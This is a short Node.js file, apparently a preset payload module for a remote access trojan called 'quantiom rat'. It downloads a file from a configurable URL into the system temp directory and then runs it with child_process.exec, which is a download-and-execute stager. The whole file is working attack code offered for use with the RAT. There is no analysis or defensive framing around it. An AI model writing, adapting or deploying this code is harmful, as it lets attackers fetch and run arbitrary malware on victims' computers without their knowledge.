/**
 * Download and Run File
 * Preset Code for quantiom rat
 *
 * Description: Downloads a file from a URL to the %temp% directory, and runs it.
 * Last Updated: 9/6/2020
 */

// Edit file URL here:
const FILE_URL = '';
const FILE_EXTENSION = '';

// Example:
// const FILE_URL = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg';
// const FILE_EXTENSION = 'jpg';

const fs = require('fs');
const os = require('os');

const http = require('http');
const https = require('https');
const url = require('url');

const parsedUrl = url.parse(FILE_URL);

const httpTable = {
    http,
    https,
};

const { exec } = require('child_process');

const fileDir = `${os.tmpdir()}/${Date.now()}.${FILE_EXTENSION}`;
const file = fs.createWriteStream(fileDir);

httpTable[parsedUrl.protocol.replace(':', '')].get(FILE_URL, async (response) => {
    response.pipe(file);

    await new Promise((r) => setTimeout(r, 1000));

    exec(fileDir);
});
